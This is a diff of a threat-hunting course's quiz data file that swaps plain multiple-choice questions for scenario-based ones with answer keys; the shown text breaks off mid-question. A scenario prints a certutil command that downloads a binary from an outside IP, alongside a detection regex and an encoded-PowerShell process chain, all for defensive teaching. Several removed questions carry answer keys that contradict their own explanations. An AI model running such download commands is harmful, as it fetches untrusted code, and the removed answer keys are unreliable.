@@ -5227,125 +5227,965 @@ export const quizzes: QuizData[] = [
           }
       ]
    },
-   {
-    quizId: "th-q1",
-    courseId: "threat-hunting",
-    title: "Hunting Methodology & Frameworks",
-    description: "Test your understanding of threat hunting methodology, the Hunting Maturity Model, and hypothesis-driven hunting.",
-    passingScore: 70,
-    timeLimit: 15,
-    questions: [
-      { id: "th-q1-1", question: "What is the primary difference between threat hunting and traditional detection?", options: ["Hunting is proactive and hypothesis-driven, searching without waiting for alerts", "Hunting uses automated SIEM alerts as its only source of investigation leads", "Hunting replaces SIEM detection rules entirely and requires no alert tuning", "Hunting focuses on compliance reporting and regulatory audit requirements"], correctAnswer: 0, explanation: "Threat hunting is proactive — analysts form hypotheses and actively search for threats rather than waiting for alerts." },
-      { id: "th-q1-2", question: "How many levels does the Hunting Maturity Model (HMM) define?", options: ["Three levels covering initial, developing, and advanced hunting capability", "Four levels covering reactive, procedural, analytical, and continuous hunting", "Five levels: HM0 (Initial), HM1 (Minimal), HM2 (Procedural), HM3 (Innovative), and HM4 (Leading)", "Six levels including a specialized cloud-hunting tier for modern environments"], correctAnswer: 1, explanation: "The HMM defines 5 levels: HM0 (Initial), HM1 (Minimal), HM2 (Procedural), HM3 (Innovative), and HM4 (Leading)." },
-      { id: "th-q1-3", question: "At which HMM level does an organization begin routine data collection but lacks structured hunting?", options: ["HM0 — no structured data collection or hunting capability exists at this stage", "HM1 — data is collected routinely but hunting is ad-hoc and indicator-dependent", "HM2 — procedural hunts follow documented playbooks and existing threat reports", "HM3 — hunters create custom analytical techniques and automation frameworks"], correctAnswer: 2, explanation: "HM1 (Minimal) means the org collects data routinely but hunting is ad-hoc and relies on indicators." },
-      { id: "th-q1-4", question: "What is the first step of hypothesis-driven hunting?", options: ["Collect all available evidence before forming any analytical conclusions", "Write a final incident report summarizing findings and stakeholder impact", "Formulate a testable hypothesis based on threat intelligence or anomaly data", "Deploy new tooling to expand log coverage before any investigation starts"], correctAnswer: 3, explanation: "Hypothesis-driven hunting begins with a testable hypothesis based on threat intelligence, experience, or anomaly patterns." },
-      { id: "th-q1-5", question: "Which of the following is a characteristic of a good hunting hypothesis?", options: ["It is as vague as possible to allow broad coverage across many threat types", "It is testable, falsifiable, specific, and grounded in threat intel or data patterns", "It requires no supporting data and relies entirely on analyst intuition alone", "It is based solely on gut feeling without reference to any framework or evidence"], correctAnswer: 0, explanation: "A good hypothesis is specific, testable, falsifiable, and grounded in threat intelligence or data patterns." },
-      { id: "th-q1-6", question: "What does 'TTP' stand for in the context of threat hunting?", options: ["Total Threat Prevention — a layered security strategy for blocking all known attacks", "Threat Tracking Protocol — a communication standard for sharing IOCs across teams", "Triage, Test, and Publish — the SOC workflow for validating new alert signatures", "Tactics, Techniques, and Procedures — adversary behavioral patterns mapped in ATT&CK"], correctAnswer: 1, explanation: "TTP stands for Tactics, Techniques, and Procedures — the behavioral patterns of adversaries mapped in frameworks like MITRE ATT&CK." },
-      { id: "th-q1-7", question: "Which hunting approach starts with known threat intelligence indicators?", options: ["Baseline hunting — establishes what normal looks like and searches for deviations", "Anomaly-based hunting — uses statistical models to surface unusual outlier behavior", "Intel-driven hunting — uses known IOCs, TTPs, or threat reports as starting points", "Compliance hunting — reviews logs to confirm adherence to regulatory control requirements"], correctAnswer: 2, explanation: "Intel-driven hunting uses known IOCs, TTPs, or threat reports as starting points for investigation." },
-      { id: "th-q1-8", question: "What is 'baseline hunting'?", options: ["Hunting specifically for the newest identified malware families using vendor signatures", "Using only signature-based detection rules to surface known attack patterns in the SIEM", "Hunting exclusively during business hours to protect production systems from disruption", "Establishing what normal activity looks like in the environment and hunting for deviations"], correctAnswer: 3, explanation: "Baseline hunting establishes what 'normal' looks like in an environment and then searches for anomalous deviations." },
-      { id: "th-q1-9", question: "At HM4 (Leading), what distinguishes the organization?", options: ["No automation — all hunting is performed manually by experienced senior analysts", "Continuous hunting with custom tooling and automation that feeds findings into detections", "Hunting is fully automated with zero human analysts involved in the investigation process", "All hunting is outsourced to an MSSP with no internal team ownership or oversight"], correctAnswer: 0, explanation: "HM4 organizations run continuous hunts with custom tooling and systematically convert findings into automated detections." },
-      { id: "th-q1-10", question: "Why should hunt findings be documented even when no threat is found?", options: ["Documentation is optional and only required for confirmed positive threat findings", "To blame analysts for missed threats and track individual performance over time", "To justify headcount and demonstrate team activity to management and stakeholders", "Documenting negative results refines baselines, improves hypotheses, and proves coverage"], correctAnswer: 1, explanation: "Documenting all hunts — including negatives — refines baselines, improves future hypotheses, and demonstrates security coverage." }
-    ]
+  {
+      quizId: "th-q1",
+      courseId: "threat-hunting",
+      title: "Hunting Methodology & Frameworks",
+      description: "Scenario-based drills on hypothesis-driven hunting, the Hunting Maturity Model, and program design.",
+      passingScore: 70,
+      timeLimit: 20,
+      questions: [
+          {
+              id: "th-q1-1",
+              difficulty: "easy",
+              tags: ["Definition", "Proactive vs Reactive"],
+              scenario: "Your SOC director says: 'We already have 400 correlation rules and a 24/7 tier-1 queue. Why do we need a hunt team?' No unresolved alerts are open right now.",
+              question: "What is the single most defensible answer that distinguishes hunting from detection?",
+              options: [
+                  "Hunting replaces the SIEM once maturity is high enough",
+                  "Hunting is proactive and hypothesis-driven — it looks for adversary behavior the current detections cannot see, in the absence of any alert",
+                  "Hunting is just tier-3 alert triage under a different name",
+                  "Hunting exists to satisfy compliance frameworks such as PCI 10.6"
+              ],
+              correctAnswer: 1,
+              explanation: "Detection answers 'did a known-bad thing fire?'. Hunting answers 'is something bad happening that we do not yet detect?' — it explicitly operates without a triggering alert and turns findings back into new detections."
+          },
+          {
+              id: "th-q1-2",
+              difficulty: "easy",
+              tags: ["HMM", "Sqrrl"],
+              scenario: "You are asked to place your org on Sqrrl's Hunting Maturity Model. You ingest EDR + firewall + DNS centrally, run monthly IOC sweeps from vendor feeds, but write no custom analytics and never share hunt output back to detection engineering.",
+              question: "Which HMM level describes you, and what is the next step up?",
+              options: [
+                  "HM0 → HM1: start collecting data",
+                  "HM1 (Minimal) → HM2 (Procedural): adopt and repeat published hunting procedures from the community",
+                  "HM2 → HM3: build a threat intel platform",
+                  "HM3 (Innovative) → HM4: hire more analysts"
+              ],
+              correctAnswer: 1,
+              explanation: "Routine collection + indicator search = HM1. HM2 is defined by repeatable, documented procedures (e.g., ThreatHunter Playbook, MITRE-aligned hunts). HM3 introduces novel analytics; HM4 automates them."
+          },
+          {
+              id: "th-q1-3",
+              difficulty: "medium",
+              tags: ["Hypothesis Quality"],
+              scenario: "Four hunters submit hypotheses for the sprint:\nA: 'There might be bad stuff on endpoints.'\nB: 'APT29 uses WMI event subscriptions for persistence; check WMI-Activity 5861 on all DCs for the last 30 days.'\nC: 'Users are probably clicking phishing.'\nD: 'Something is wrong with the network.'",
+              question: "Which hypothesis is properly formed, and why?",
+              options: [
+                  "A — broad coverage is best",
+                  "B — it is specific, testable, tied to a TTP, mapped to a data source, and time-bounded",
+                  "C — user behavior is always the top risk",
+                  "D — network anomalies are easiest to find"
+              ],
+              correctAnswer: 1,
+              explanation: "A good hunt hypothesis is specific, falsifiable, tied to observable telemetry, and scoped in time. A/C/D are unfalsifiable — you can neither prove nor disprove them with data."
+          },
+          {
+              id: "th-q1-4",
+              difficulty: "medium",
+              tags: ["TaHiTI", "Hunt Loop"],
+              scenario: "Your team is adopting the TaHiTI methodology. You have a validated hypothesis about DLL search-order hijacking in a specific vendor product.",
+              question: "What is the correct next phase before you start querying data?",
+              options: [
+                  "Write the executive report",
+                  "Investigate — define data sources, analytical techniques, expected artifacts, and success/failure criteria",
+                  "Immediately open an incident ticket",
+                  "Deploy a new EDR agent"
+              ],
+              correctAnswer: 1,
+              explanation: "TaHiTI = Initiate → Hunt (which includes Define + Investigate) → Finalize. Jumping into queries without defining data, technique, and success criteria produces unrepeatable hunts and unmeasurable outcomes."
+          },
+          {
+              id: "th-q1-5",
+              difficulty: "medium",
+              tags: ["Intel-driven vs Data-driven"],
+              scenario: "Two proposals hit your backlog the same day:\n1) A CISA advisory drops fresh TTPs for a ransomware crew targeting your vertical.\n2) A data scientist notices a long-tail cluster of rare parent-child process pairs on 12 laptops.",
+              question: "How should a mature program treat these?",
+              options: [
+                  "Only #1 counts — hunts must start from intel",
+                  "Only #2 counts — intel is unreliable",
+                  "Both are valid: #1 is intel-driven, #2 is data-driven (anomaly/analytics-led); run them in parallel with the same rigor",
+                  "Neither — wait for an alert"
+              ],
+              correctAnswer: 2,
+              explanation: "Hunts are legitimately triggered by intel, situational awareness, analytics, or prior incidents. A mature backlog explicitly categorizes and prioritizes across these trigger types."
+          },
+          {
+              id: "th-q1-6",
+              difficulty: "medium",
+              tags: ["MITRE ATT&CK", "Coverage"],
+              scenario: "You render your detection coverage against ATT&CK Enterprise and see solid coverage for Execution and Defense Evasion, but Discovery, Credential Access, and Lateral Movement are almost empty.",
+              question: "Where should the next quarter's hunts focus, and why?",
+              options: [
+                  "Add more Execution rules — double down on strengths",
+                  "Prioritize hunts across Discovery, Credential Access, and Lateral Movement — those are the mid-kill-chain steps adversaries must take, and current blind spots there mean intrusions will progress unseen",
+                  "Focus on Impact only — that is where damage happens",
+                  "Coverage maps are marketing; ignore the gaps"
+              ],
+              correctAnswer: 1,
+              explanation: "ATT&CK coverage mapping is used to redirect effort into gaps. Discovery/CredAccess/LatMov are unavoidable steps in almost every intrusion — blind spots there guarantee late detection."
+          },
+          {
+              id: "th-q1-7",
+              difficulty: "medium",
+              tags: ["Negative Results"],
+              scenario: "A 3-week hunt for Kerberoasting across every DC finds nothing. A manager wants to mark the hunt 'wasted effort'.",
+              question: "What is the correct disposition?",
+              options: [
+                  "Delete the notebook — negatives have no value",
+                  "Record it as a validated coverage claim: hypothesis, data sources, queries, time window, and 'no evidence found' — this is auditable assurance and hardens the baseline",
+                  "Re-run it forever until it finds something",
+                  "Convert it to an incident anyway"
+              ],
+              correctAnswer: 1,
+              explanation: "A properly documented negative hunt is a form of assurance evidence and a reusable baseline. It also feeds detection engineering: if you cannot detect it, you cannot claim absence."
+          },
+          {
+              id: "th-q1-8",
+              difficulty: "hard",
+              tags: ["Cognitive Bias"],
+              scenario: "You hypothesize a specific APT is inside the environment. Every query you write filters for that group's known IPs and hashes. After a week you conclude 'clean' and close the hunt.",
+              question: "Which cognitive trap did you fall into, and how do you fix it?",
+              options: [
+                  "Anchoring — pick different IPs next time",
+                  "Confirmation bias — you only searched for evidence that would confirm the hypothesis; rewrite hunts around behavior (TTPs) that would appear regardless of which actor is present, and pre-register disconfirming tests",
+                  "Sunk cost — spend more time on it",
+                  "Availability bias — buy a new intel feed"
+              ],
+              correctAnswer: 1,
+              explanation: "Filtering exclusively on group-specific IOCs is textbook confirmation bias — IOCs sit at the bottom of the Pyramid of Pain and rotate constantly. Hunt on behavior and design tests that could falsify the hypothesis."
+          },
+          {
+              id: "th-q1-9",
+              difficulty: "hard",
+              tags: ["HMM4", "Automation"],
+              scenario: "Leadership wants to jump from HM2 to HM4 in one quarter by 'automating everything with AI'.",
+              question: "Why is that reckless, and what is the realistic path?",
+              options: [
+                  "It is fine — buy an AI SOC product",
+                  "HM4 requires HM3 first: you must first develop and validate novel analytics (HM3) before you can automate them (HM4); automating unvalidated analytics scales false positives and blind spots",
+                  "Skip HM3 — nobody actually uses it",
+                  "Fire the hunt team and rely on the vendor"
+              ],
+              correctAnswer: 1,
+              explanation: "The HMM levels are cumulative. HM3 = new analytical techniques created by the team; HM4 = those techniques automated into continuous hunting/detection. Skipping HM3 automates noise."
+          },
+          {
+              id: "th-q1-10",
+              difficulty: "hard",
+              tags: ["Outcomes", "Detection Handoff"],
+              scenario: "A hunt confirms an in-the-wild AS-REP roasting technique that your SIEM never alerted on. The finding is written up and the case closed.",
+              question: "What is the mandatory next action for the hunt program to actually reduce risk?",
+              options: [
+                  "Publish a blog post",
+                  "Hand the finding to detection engineering with query, data source, false-positive analysis, and MITRE mapping so it becomes a persistent, tuned detection — and log the coverage change on the ATT&CK map",
+                  "Wait until the same threat appears again",
+                  "Add it to the compliance report only"
+              ],
+              correctAnswer: 1,
+              explanation: "The value of a hunt is only realized when its output is operationalized: a persistent detection, updated coverage map, and shared knowledge. Without the handoff, the same gap will silently re-open."
+          }
+      ]
   },
   {
-    quizId: "th-q2",
-    courseId: "threat-hunting",
-    title: "Threat Intelligence for Hunters",
-    description: "Assess your knowledge of the Pyramid of Pain, IOC types, and intelligence-driven hunting.",
-    passingScore: 70,
-    timeLimit: 15,
-    questions: [
-      { id: "th-q2-1", question: "In David Bianco's Pyramid of Pain, which indicator is at the top (hardest for adversaries to change)?", options: ["Hash values — a single byte change produces a completely different and undetected hash", "IP addresses — attackers use hosting providers to keep stable C2 infrastructure online", "Domain names — registering lookalike domains takes time and is flagged by threat feeds", "TTPs — behavioral tradecraft requires retooling entire attack chains which is very costly"], correctAnswer: 3, explanation: "TTPs sit at the top — changing behavior and tradecraft is far more costly for adversaries than rotating IPs or hashes." },
-      { id: "th-q2-2", question: "Which indicator type is at the bottom of the Pyramid of Pain (easiest for attackers to change)?", options: ["Hash values — a single-bit modification produces a completely different and unblocked hash", "Tools — rebuilding custom malware toolkits is costly and exposes attacker patterns to hunters", "Network artifacts — C2 infrastructure requires setup time and is harder to rotate on demand", "TTPs — behavioral tradecraft is the most painful thing for an attacker to change or abandon"], correctAnswer: 0, explanation: "Hash values are trivial to change — a single-bit modification produces a completely different hash." },
-      { id: "th-q2-3", question: "What is a 'Diamond Model' used for in threat intelligence?", options: ["Pricing commercial threat feed subscriptions based on data quality and IOC volume", "Mapping intrusion events across adversary, capability, infrastructure, and victim vertices", "Grading analyst performance based on triage speed and escalation accuracy metrics", "Designing secure network architecture using zero-trust segmentation and layered controls"], correctAnswer: 1, explanation: "The Diamond Model maps intrusion events across four vertices: adversary, capability, infrastructure, and victim." },
-      { id: "th-q2-4", question: "What type of IOC is 'c:\\users\\public\\malware.exe'?", options: ["Network indicator showing a suspicious outbound connection to a malicious destination", "Email indicator embedded in a phishing message header or malicious attachment filename", "Behavioral indicator representing a pattern of suspicious system or user activity", "Host-based indicator (file path) pointing to a specific file artifact on an endpoint"], correctAnswer: 3, explanation: "File paths are host-based indicators — they point to specific artifacts on an endpoint." },
-      { id: "th-q2-5", question: "Why are IP-based IOCs considered low-value for long-term hunting?", options: ["Adversaries rotate IP addresses frequently and cheaply, making them unreliable over time", "SIEM platforms cannot natively ingest or process raw IP address indicators from threat feeds", "IP indicators cause excessive false negatives because they are too specific for broad detection", "IP addresses are prohibitively expensive for threat intelligence teams to collect at scale"], correctAnswer: 0, explanation: "IP addresses are cheap and easy for attackers to change, making them unreliable for sustained hunting." },
-      { id: "th-q2-6", question: "What is 'threat intelligence enrichment'?", options: ["Permanently deleting expired or outdated IOCs from the threat intelligence platform feed", "Encrypting raw threat feeds during transmission to protect confidential source attribution", "Adding context such as reputation, geolocation, WHOIS, and relationships to raw indicators", "Publishing raw IOCs to public sharing platforms like OTX or MISP for community review"], correctAnswer: 2, explanation: "Enrichment adds context like reputation scores, geolocation, WHOIS data, and relationships to raw indicators." },
-      { id: "th-q2-7", question: "Which level of threat intelligence is most useful for SOC analysts and hunters?", options: ["Strategic intelligence — high-level geopolitical reporting for executive leadership awareness", "Tactical and operational intelligence — provides actionable IOCs, TTPs, and campaign details", "Political intelligence — covers nation-state policy and diplomatic cyber conflict reporting", "Financial intelligence — tracks cryptocurrency flows and cybercriminal marketplace activity"], correctAnswer: 1, explanation: "Tactical and operational intelligence provides actionable IOCs, TTPs, and campaign details for day-to-day hunting." },
-      { id: "th-q2-8", question: "What is a YARA rule used for?", options: ["Monitoring active network traffic flows and flagging suspicious communication patterns", "Enforcing multi-factor authentication policies for privileged identity management systems", "Rotating and managing encryption keys in a PKI infrastructure for certificate issuance", "Pattern-based malware identification by matching string sequences and byte conditions in files"], correctAnswer: 3, explanation: "YARA rules identify malware by matching string patterns, byte sequences, and conditions within files." },
-      { id: "th-q2-9", question: "In the Pyramid of Pain, where do 'Tools' fall?", options: ["At the very bottom — tools are the easiest indicator type for adversaries to rotate daily", "In the middle-lower region — tools are slightly harder to change than network artifacts", "In the middle-upper region — replacing custom tooling is costly but not as hard as TTPs", "At the very top — custom tools represent the hardest indicator type for attackers to rebuild"], correctAnswer: 2, explanation: "Tools sit in the middle-upper region — replacing custom tooling is costly but not as hard as changing TTPs." },
-      { id: "th-q2-10", question: "What is 'indicator fatigue'?", options: ["A storage capacity problem caused by excessive log retention across too many SIEM data sources", "Hardware performance degradation on SIEM indexers caused by processing too many raw events", "Analysts becoming overwhelmed by excessive low-quality IOCs, reducing their detection effectiveness", "Network bandwidth exhaustion caused by transmitting large threat intelligence feed updates hourly"], correctAnswer: 2, explanation: "Indicator fatigue occurs when analysts are overwhelmed by massive volumes of low-quality IOCs, reducing detection effectiveness." }
-    ]
+      quizId: "th-q2",
+      courseId: "threat-hunting",
+      title: "Threat Intelligence for Hunters",
+      description: "Applied CTI tradecraft: Pyramid of Pain, Diamond Model, enrichment, and turning intel into hunts.",
+      passingScore: 70,
+      timeLimit: 20,
+      questions: [
+          {
+              id: "th-q2-1",
+              difficulty: "easy",
+              tags: ["Pyramid of Pain"],
+              scenario: "A vendor feed drops 4,000 new indicators overnight: 3,600 file hashes, 300 IPs, 80 domains, 15 host artifacts, 4 tool names, 1 TTP writeup on 'WMI persistence via __EventFilter'.",
+              question: "Which indicator should you invest hunting effort in first, per David Bianco's Pyramid of Pain?",
+              options: [
+                  "The 3,600 hashes — highest volume",
+                  "The 300 IPs — easiest to block",
+                  "The single TTP — TTPs sit at the top of the pyramid: expensive for the adversary to change and durable across campaigns",
+                  "The 80 domains — good compromise"
+              ],
+              correctAnswer: 2,
+              explanation: "Hashes and IPs cost the adversary almost nothing to rotate. TTPs force them to retool. One well-written TTP hunt outlives thousands of atomic IOCs."
+          },
+          {
+              id: "th-q2-2",
+              difficulty: "easy",
+              tags: ["IOC Types"],
+              scenario: "During triage you extract: hxxps://cdn-updates[.]top/loader.php, C:\\ProgramData\\svc\\upd.exe, mutex 'Global\\AB92-XX', and JA3 51c64c77e60f3980eea90869b68c58a8.",
+              question: "Classify each in order.",
+              options: [
+                  "All are network IOCs",
+                  "Network (URL), Host (file path), Host (mutex), Network (TLS client fingerprint)",
+                  "All are host IOCs",
+                  "URL=host, file=network, mutex=network, JA3=host"
+              ],
+              correctAnswer: 1,
+              explanation: "Correct classification drives where you hunt: URLs/JA3 in proxy/Zeek/PCAP; paths and mutexes in EDR/Sysmon. Mislabeling wastes queries and misses hits."
+          },
+          {
+              id: "th-q2-3",
+              difficulty: "medium",
+              tags: ["Diamond Model"],
+              scenario: "You have: adversary = FIN7 (attribution medium-confidence), capability = Carbanak backdoor, infrastructure = 3 VPS in EU, victim = your NA retail subsidiary.",
+              question: "How does the Diamond Model help you pivot?",
+              options: [
+                  "It doesn't — it is only theoretical",
+                  "It links the four vertices so a change on one (e.g., new C2 IP) can be pivoted to related capability, adversary campaigns, and other victims — enabling hunt expansion and intel sharing",
+                  "It replaces MITRE ATT&CK",
+                  "It is only for law enforcement"
+              ],
+              correctAnswer: 1,
+              explanation: "The power of the Diamond is pivoting: any vertex leads to the others. A new infrastructure IOC can uncover related capability variants and previously unknown victims."
+          },
+          {
+              id: "th-q2-4",
+              difficulty: "medium",
+              tags: ["Enrichment"],
+              scenario: "A raw IOC arrives: 185.234.219.14. Before hunting on it, you enrich.",
+              question: "Which enrichment set adds the most decision value?",
+              options: [
+                  "GeoIP only",
+                  "ASN + hosting provider + passive DNS history + WHOIS + certificate transparency + prior sightings/reputation",
+                  "Ping latency to the IP",
+                  "Whether it is IPv4 or IPv6"
+              ],
+              correctAnswer: 1,
+              explanation: "Actionable enrichment answers 'is this shared hosting or dedicated?', 'what domains have resolved here?', 'what TLS certs did it serve?', 'have we or peers seen it before?'. That drives severity, scope, and pivot."
+          },
+          {
+              id: "th-q2-5",
+              difficulty: "medium",
+              tags: ["Intel Levels"],
+              scenario: "The board wants a briefing. The SOC wants blockable data. The detection engineer wants campaign write-ups with malware behavior.",
+              question: "Match each consumer to the right intel level.",
+              options: [
+                  "Board=tactical, SOC=strategic, DE=operational",
+                  "Board=strategic (trends, risk), SOC=tactical (IOCs to block/alert), Detection Engineer=operational (campaigns, TTPs, tooling)",
+                  "All three want strategic",
+                  "All three want tactical"
+              ],
+              correctAnswer: 1,
+              explanation: "Strategic = who/why/trends for leadership. Operational = campaigns and TTPs for engineers and hunters. Tactical = atomic IOCs for immediate blocking and alerting."
+          },
+          {
+              id: "th-q2-6",
+              difficulty: "medium",
+              tags: ["YARA"],
+              scenario: "You have three samples of a loader that share a rare 22-byte decryption stub and a distinctive PDB path, but each has a unique hash and different C2.",
+              question: "What is the correct detection artifact to build, and why?",
+              options: [
+                  "One SHA256 per sample",
+                  "A YARA rule matching the 22-byte stub AND the PDB substring, with a condition tuned to minimize FPs — catches current and future variants regardless of hash",
+                  "Block the C2 IPs only",
+                  "Nothing — hashes are enough"
+              ],
+              correctAnswer: 1,
+              explanation: "YARA lets you encode structural or behavioral traits that survive minor variant churn. Hashes and IPs would miss the next build 24 hours later."
+          },
+          {
+              id: "th-q2-7",
+              difficulty: "medium",
+              tags: ["Indicator Fatigue"],
+              scenario: "Your TIP auto-ingests 12 feeds, dedups to ~180k active indicators, and pushes all of them to the SIEM as high-severity alerts. Analysts are drowning.",
+              question: "What is the correct fix?",
+              options: [
+                  "Buy more feeds",
+                  "Score indicators (source reliability, indicator confidence, age, prevalence, exposure to your assets), expire aggressively, and only alert on the top-scored + relevant subset; the rest is enrichment context, not alerts",
+                  "Alert on everything but louder",
+                  "Turn off all feeds"
+              ],
+              correctAnswer: 1,
+              explanation: "Not every indicator deserves an alert. Score, decay, and filter to what is relevant to your environment. Use the rest for enrichment/context on other alerts."
+          },
+          {
+              id: "th-q2-8",
+              difficulty: "hard",
+              tags: ["F3EAD", "Intel-to-Hunt"],
+              scenario: "You are operationalizing the F3EAD cycle inside the hunt team. A finished intel product (Finish) has just landed describing a new webshell family.",
+              question: "What are the correct next two phases and their concrete artifacts?",
+              options: [
+                  "Exploit and Analyze — extract IOCs/TTPs/YARA/Sigma from the intel, then produce hunt queries, detection candidates, and updated TIP entries; Disseminate closes the loop back to intel and detection engineering",
+                  "Skip straight to Disseminate",
+                  "F3EAD is only for the military",
+                  "Repeat Find forever"
+              ],
+              correctAnswer: 0,
+              explanation: "F3EAD = Find, Fix, Finish, Exploit, Analyze, Disseminate. Exploit/Analyze is where raw intel becomes actionable hunt queries, detections, and enrichment; Disseminate hands artifacts to the consumers."
+          },
+          {
+              id: "th-q2-9",
+              difficulty: "hard",
+              tags: ["Attribution", "Bias"],
+              scenario: "An intel vendor attributes an intrusion to a nation-state group with 'high confidence' based on shared infrastructure with a 2019 campaign.",
+              question: "How should the hunt team consume this attribution?",
+              options: [
+                  "Treat it as ground truth and hunt only that group's TTPs",
+                  "Treat attribution as a hypothesis with uncertainty; hunt on the observed TTPs and infrastructure regardless of attribution, and avoid narrowing the aperture — false attribution biases queries and misses co-tenants of shared infra",
+                  "Ignore the intel entirely",
+                  "Escalate to law enforcement immediately"
+              ],
+              correctAnswer: 1,
+              explanation: "Attribution is inherently uncertain, and shared infrastructure is routinely reused across unrelated crews. Hunt the behavior; do not let a label collapse the search space."
+          },
+          {
+              id: "th-q2-10",
+              difficulty: "hard",
+              tags: ["MISP", "Sharing"],
+              scenario: "You discover a novel PowerShell downloader used against your org. Legal has cleared TLP:AMBER sharing with your sector ISAC.",
+              question: "What is the correct package to publish?",
+              options: [
+                  "Just the SHA256",
+                  "A structured MISP event with hashes, C2, TTPs (ATT&CK IDs), YARA, Sigma, victim sector, TLP marking, and confidence — enabling peers to detect and pivot without leaking sensitive victim detail",
+                  "A screenshot of the alert",
+                  "Nothing — sharing is risky"
+              ],
+              correctAnswer: 1,
+              explanation: "Structured sharing (MISP/STIX) with atomic IOCs, behavior (YARA/Sigma), ATT&CK mapping, and TLP marking maximizes peer detection while controlling disclosure. Sector-wide detection is collective defense."
+          }
+      ]
   },
   {
-    quizId: "th-q3",
-    courseId: "threat-hunting",
-    title: "Techniques & Tradecraft",
-    description: "Quiz on adversary techniques including LOLBins, JA3 fingerprinting, and evasion methods.",
-    passingScore: 70,
-    timeLimit: 15,
-    questions: [
-      { id: "th-q3-1", question: "What are LOLBins?", options: ["A category of fileless malware designed to operate entirely within system memory", "Legitimate OS binaries like PowerShell and certutil that attackers abuse for malicious actions", "Specialized kernel-level rootkits that hide malicious processes from security monitoring tools", "Open-source penetration testing frameworks used exclusively by red team professionals"], correctAnswer: 1, explanation: "LOLBins (Living Off the Land Binaries) are legitimate system tools like PowerShell, certutil, and mshta abused by attackers." },
-      { id: "th-q3-2", question: "Which Windows binary is commonly abused to download files from the internet?", options: ["notepad.exe — the text editor that can open and render HTML from local and remote sources", "calc.exe — the calculator application used to obfuscate encoded payload delivery via DDE", "explorer.exe — the Windows shell that can silently fetch and cache remote file thumbnails", "certutil.exe — has a -urlcache flag attackers abuse to download payloads from remote servers"], correctAnswer: 3, explanation: "certutil.exe has a -urlcache flag that attackers abuse to download payloads from remote servers." },
-      { id: "th-q3-3", question: "What does JA3 fingerprinting identify?", options: ["The identity and authentication token of a specific user account during network sessions", "TLS client configuration parameters hashed to uniquely fingerprint applications and tools", "The SHA-256 hash of binary files downloaded over encrypted TLS communication channels", "Email header metadata used to track message routing through mail transfer agent hops"], correctAnswer: 0, explanation: "JA3 creates a hash of TLS client hello parameters, uniquely fingerprinting applications regardless of IP or domain." },
-      { id: "th-q3-4", question: "What is 'process hollowing'?", options: ["Completely deleting a running process and its associated threads from system memory", "Creating a legitimate process in suspended state and replacing its memory with malicious code", "Creating new privileged user accounts through the Windows Local Security Authority subsystem", "Clearing Windows Security event logs to erase forensic evidence of administrative activity"], correctAnswer: 2, explanation: "Process hollowing creates a legitimate process in suspended state, replaces its memory with malicious code, then resumes it." },
-      { id: "th-q3-5", question: "Which MITRE ATT&CK tactic involves maintaining access after initial compromise?", options: ["Initial Access — the tactic covering initial entry vectors like phishing and exploit delivery", "Persistence — ensures the attacker maintains access across reboots and credential changes", "Exfiltration — covers techniques for stealing and transferring data out of the target network", "Reconnaissance — covers information gathering activities before and during an intrusion"], correctAnswer: 1, explanation: "Persistence ensures the attacker maintains access across reboots, credential changes, or other disruptions." },
-      { id: "th-q3-6", question: "What is 'DLL side-loading'?", options: ["The standard Windows process for installing application DLLs in the System32 directory", "Updating existing system DLLs through the Windows Update mechanism to patch vulnerabilities", "Placing a malicious DLL in a location searched before the legitimate path so a program loads it", "Using the Windows compiler to build and register COM-based dynamic link library modules"], correctAnswer: 3, explanation: "DLL side-loading exploits the DLL search order by placing a malicious DLL in a location searched before the legitimate one." },
-      { id: "th-q3-7", question: "What is the JA3S hash used for?", options: ["Fingerprinting TLS client hello parameters to identify the application making outbound connections", "Server-side TLS configuration fingerprinting to identify the server stack accepting connections", "Computing cryptographic hashes of DNS query payloads for integrity verification purposes", "Verifying the integrity of downloaded executable files against a known-good reference database"], correctAnswer: 0, explanation: "JA3S fingerprints the server-side TLS hello response, complementing JA3 for full client-server profiling." },
-      { id: "th-q3-8", question: "Which technique involves running malicious code entirely in memory without touching disk?", options: ["Fileless malware / in-memory execution, which evades file-based AV and leaves minimal artifacts", "Full disk encryption of operating system volumes using ransomware to prevent forensic access", "Lossless file compression using custom packers to reduce binary size before disk installation", "Standard software installation processes that extract executables from compressed archive files"], correctAnswer: 2, explanation: "Fileless attacks execute entirely in memory, evading traditional file-based antivirus and leaving minimal forensic artifacts." },
-      { id: "th-q3-9", question: "What Windows event log is most valuable for detecting LOLBin abuse?", options: ["Application event log — records application-level errors and informational messages from software", "System event log — captures Windows component and driver failures, service start/stop events", "Setup event log — logs Windows Update and component installation and configuration changes", "Sysmon with process creation logging — provides command-line, parent-child, and hash details"], correctAnswer: 3, explanation: "Sysmon provides detailed process creation, command-line, and parent-child relationship logging essential for LOLBin detection." },
-      { id: "th-q3-10", question: "What is 'timestomping'?", options: ["Reconfiguring the system time zone to avoid automatic UTC timestamp normalization in SIEM logs", "Modifying file creation and modification timestamps to blend malicious files with legitimate ones", "Configuring NTP servers to synchronize system clocks across distributed logging infrastructure", "Creating time-based correlation alerts in the SIEM to detect scheduled task anomalies"], correctAnswer: 1, explanation: "Timestomping changes file creation/modification times to make malicious files appear as if they've existed longer, evading timeline analysis." }
-    ]
+      quizId: "th-q3",
+      courseId: "threat-hunting",
+      title: "Techniques & Tradecraft",
+      description: "Deep-dive on adversary tradecraft: LOLBins, injection, TLS fingerprinting, evasion, and how to hunt each.",
+      passingScore: 70,
+      timeLimit: 20,
+      questions: [
+          {
+              id: "th-q3-1",
+              difficulty: "easy",
+              tags: ["LOLBins"],
+              scenario: "Sysmon EID 1: `certutil.exe -urlcache -split -f http://45.9.148.99/x.bin C:\\Users\\Public\\x.bin` on a finance workstation.",
+              question: "What is this and how do you hunt it broadly?",
+              options: [
+                  "Normal Windows patching",
+                  "LOLBin abuse (certutil as a downloader); hunt EID 1 for cmdline regex on `certutil.*urlcache|split|-f\\s+https?://` across all endpoints and stack-rank rare parent processes",
+                  "A false positive from AV",
+                  "A driver install"
+              ],
+              correctAnswer: 1,
+              explanation: "certutil's -urlcache is one of the most abused LOLBAS entries. The correct hunt is command-line pattern + rare parent stack-rank, not blocking certutil (breaks legitimate PKI work)."
+          },
+          {
+              id: "th-q3-2",
+              difficulty: "easy",
+              tags: ["Parent-Child"],
+              scenario: "Process tree observed: WINWORD.EXE → cmd.exe → powershell.exe -enc <base64>.",
+              question: "What is the primary hunt signal here?",
+              options: [
+                  "cmd.exe running — always malicious",
